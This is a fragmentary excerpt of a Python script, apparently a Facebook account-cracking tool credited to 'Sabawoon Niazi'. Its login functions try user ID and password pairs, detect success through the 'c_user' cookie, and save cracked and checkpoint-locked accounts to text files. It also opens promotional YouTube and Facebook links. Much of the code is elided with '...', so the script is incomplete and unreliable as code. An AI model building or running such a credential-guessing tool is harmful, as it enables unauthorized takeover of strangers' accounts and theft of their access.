...
# fb page https://facebook.com/groups/1013726352137625/
...
os.system("clear")
print("Subscraibe my you tube chanel")
os.system("xdg-open https://youtube.com/@afghantechnical172?si=WvY6scveG_tE8UAF")
#app  check 
...
[+]==============================================
[+] CREATED BY   :  Sabawoon Niazi
[+] FB GROUP     :    Helpe
[+] ON GITHUB    :  Sabawoon Niazi
[+] TOOL STATUS  :  RANDOM
[+] TOOL VIRSION :  0.2
[+]=============================================="""
...
def jonty():
    ...
    elif aryan =='7':os.system("xdg-open https://facebook.com/groups/1013726352137625/")
    else:
...
def xerx2():
	...
	print('[?] Ids saved in Niazi-OK.txt,Niazi-CP.txt')
	print(47*"-")
...
def mbasic(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[1;92m[Niazi-OK] '+cid+' | '+ps+'\33[0;97m')
				if 'y' in xerx_xd:
				...
				cid = coki[141:156]
				if 'y' in baby:
					print('\33[1;91m[Niazi-CP] '+cid+' | '+ps+'\33[0;97m')
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M1-Niazi] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def d(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M6-Niazi] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
